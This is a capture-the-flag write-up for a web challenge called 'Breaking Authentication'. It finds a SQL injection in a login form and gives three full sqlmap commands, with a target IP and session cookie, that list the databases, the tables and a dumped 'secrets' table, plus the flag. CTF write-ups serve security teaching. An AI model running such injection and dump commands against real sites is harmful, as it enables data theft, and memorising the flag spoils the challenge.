# Challenge WEB: Breaking Authentication
![image](https://github.com/user-attachments/assets/8f1ed3a7-d3d8-4d6a-8d79-3c7ad5828a98)

First we have the login form, I tried username: ' , passwd: 1 and I found it:
![image](https://github.com/user-attachments/assets/f5096ad8-3594-43ad-ad26-038de03643dc)

it gives query error and we see database management system is mySQL 
![image](https://github.com/user-attachments/assets/01b4c0a9-a741-4054-a003-cf795a63abc1)


it causes query error and we see the database management system is mySQL, it is likely to be SQLi so I try to use sqlmap tool (you can research about this tool by AI chat):
sqlmap -u "http://23.179.17.40:58001/index.php" \
--method=POST \
--data="username=1&password=1&login=Login" \
--cookie="PHPSESSID=d1062a9958cc6bbeafcd2e8e0cb6e038" \
-p username \
--dbs \
--batch
after this command we see:
![image](https://github.com/user-attachments/assets/0502f3ed-025f-4dc0-9e8f-625450c3389f)

we have listed 5 databases:
information_schema MySQL metadata system
mysql Stores MySQL admin account, does not contain web user
performance_schema MySQL performance monitoring
sys System structure (like view)
app → Only name “sounds like web application name” you are testing
we use sql with database named app via command:
sqlmap -u "http://23.179.17.40:58001/index.php" \
--method=POST \
--data="username=1&password=1&login=Login" \
--cookie="PHPSESSID=d1062a9958cc6bbeafcd2e8e0cb6e038" \
-p username \
-D app --tables \
--batch
I see 2 tables in there and I focus on the secrets table
![image](https://github.com/user-attachments/assets/18f8bd61-7263-4dcf-89fa-2d0799246254)

The last step we need is to dump the column information in the secrets row, and after using the command:
sqlmap -u "http://23.179.17.40:58001/index.php" \
--method=POST \
--data="username=1&password=1&login=Login" \
--cookie="PHPSESSID=d1062a9958cc6bbeafcd2e8e0cb6e038" \
-p username \
-D app -T secrets --dump \
--batch
we have the flag
![image](https://github.com/user-attachments/assets/1f35112f-8c30-43cd-a32f-02334511b46f)

problem solved: CIT{36b0efd6c2ec7132}
